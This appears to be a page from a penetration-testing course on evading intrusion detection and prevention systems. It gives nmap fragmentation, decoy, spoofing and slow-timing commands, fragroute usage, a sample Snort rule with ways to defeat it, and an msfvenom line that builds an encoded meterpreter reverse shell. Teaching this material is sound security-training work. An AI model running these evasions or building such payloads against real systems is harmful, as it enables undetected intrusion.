# IDS/IPS Evasion

## Unit 10 - Topic 1 | Network Defense Evasion

---

## Overview

**IDS (Intrusion Detection Systems)** and **IPS (Intrusion Prevention Systems)** monitor network traffic for malicious activity. Understanding how they work and their limitations enables penetration testers to evade detection while testing defenses — a critical skill for realistic security assessments.

---

## 1. IDS/IPS Types

```
IDS/IPS CLASSIFICATION:

BY DETECTION METHOD:
├── Signature-Based
│   ├── Matches traffic against known attack patterns
│   ├── Fast, low false positives
│   ├── Cannot detect unknown/zero-day attacks
│   └── Examples: Snort rules, Suricata signatures
│
├── Anomaly-Based
│   ├── Learns "normal" traffic baseline
│   ├── Flags deviations from normal
│   ├── Can detect unknown attacks
│   └── Higher false positive rate
│
└── Heuristic/Behavioral
    ├── Analyzes behavior patterns
    ├── Detects attack techniques (not just signatures)
    └── Best for sophisticated attacks

BY DEPLOYMENT:
├── NIDS/NIPS — Network-based (monitors traffic)
├── HIDS/HIPS — Host-based (monitors system)
└── Hybrid — Combination approach

COMMON IDS/IPS:
├── Snort (Open source NIDS)
├── Suricata (Open source, multi-threaded)
├── Zeek/Bro (Network analysis framework)
├── OSSEC (Host-based IDS)
└── Commercial: Palo Alto, Cisco Firepower, CrowdStrike
```

---

## 2. Signature Evasion Techniques

```bash
# === FRAGMENTATION ===
# Split packets to avoid signature matching:
nmap -f target.com               # Fragment packets (8 bytes)
nmap -f -f target.com            # Tiny fragments (16 bytes)
nmap --mtu 24 target.com         # Custom MTU

# Fragroute (fragment traffic):
fragroute -f rules.conf target.com

# === PAYLOAD ENCODING ===
# Encode exploit payloads:
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.10.1 LPORT=443 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o evasion.exe
# -e: encoder
# -i: iterations (more = more encoded)

# === PROTOCOL-LEVEL EVASION ===
# Use unexpected protocols:
# ├── DNS tunneling (iodine, dnscat2)
# ├── ICMP tunneling (icmpsh)
# ├── HTTP/HTTPS (blend with web traffic)
# └── WebSocket tunnels

# === ENCRYPTION ===
# Encrypt C2 traffic:
# ├── HTTPS reverse shell (port 443)
# ├── DNS over HTTPS for C2
# ├── SSH tunnels
# └── Wireguard/OpenVPN tunnels

# === TIMING ===
# Slow down to avoid rate-based detection:
nmap -T1 target.com              # Paranoid (very slow)
nmap -T2 target.com              # Sneaky
nmap --scan-delay 5s target.com  # 5 second delay
```

---

## 3. IDS Evasion with Nmap

```bash
# === NMAP IDS EVASION OPTIONS ===

# Decoy scan (hide among fake IPs):
nmap -D RND:10 target.com
# Sends packets from 10 random decoy IPs + your real IP

# Specific decoys:
nmap -D 10.0.0.1,10.0.0.2,10.0.0.3,ME target.com

# Source port spoofing:
nmap --source-port 53 target.com    # Appear as DNS
nmap --source-port 80 target.com    # Appear as web

# Idle/Zombie scan:
nmap -sI zombie_host target.com
# Scan appears to come from zombie host

# MAC address spoofing:
nmap --spoof-mac Dell target.com
nmap --spoof-mac 00:11:22:33:44:55 target.com

# Append random data:
nmap --data-length 50 target.com
# Adds 50 random bytes to packets

# Combined evasion:
nmap -sS -T2 -f --data-length 24 \
  -D RND:5 --source-port 53 \
  --randomize-hosts target.com
```

---

## 4. Evading Common Snort Rules

```
SNORT RULE EXAMPLE:
alert tcp any any -> $HOME_NET 445 (msg:"ET EXPLOIT MS17-010";
  content:"|FF|SMB"; depth:4; content:"|23 00 00 00 07 00|";
  sid:2024218;)

EVASION APPROACHES:
├── Fragmentation — Split signature across packets
├── Session splicing — Spread payload over time
├── Polymorphism — Change payload bytes each time
├── Encoding — Base64, XOR, custom encoding
├── Case manipulation — HtTp vs HTTP (protocol fuzzing)
├── Null bytes — Insert nulls that reassemble correctly
├── TTL manipulation — Different TTLs confuse reassembly
└── Overlapping fragments — IDS and target reassemble differently
```

---

## 5. Testing IDS Detection

```bash
# === VERIFY EVASION ===
# Run without evasion first (baseline):
nmap -sV target.com
# Check if IDS alerts

# Run with evasion:
nmap -sV -T2 -f --data-length 50 target.com
# Check if IDS alerts reduced

# === TOOLS FOR TESTING ===
# Nmap + various evasion flags
# Fragroute — fragment at network layer
# Sniffjet — IDS stress testing
# Metasploit evasion modules:
use evasion/windows/applocker_evasion_msbuild
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Signature IDS** | Matches known attack patterns |
| **Anomaly IDS** | Detects deviations from baseline |
| **Fragmentation** | Split packets to break signatures |
| **Decoys** | Hide real scanner among fake IPs |
| **Encryption** | IDS cannot inspect encrypted traffic |
| **Timing** | Slow scans avoid rate-based alerts |

---

## Quick Revision Questions

1. **What is the difference between signature and anomaly-based IDS?**
2. **How does packet fragmentation evade IDS?**
3. **What is a decoy scan in Nmap?**
4. **Why does encryption effectively evade IDS?**
5. **What is session splicing?**

---

[Next: Firewall Evasion →](02-firewall-evasion.md)

---

*Unit 10 - Topic 1 of 5 | [Back to README](../README.md)*
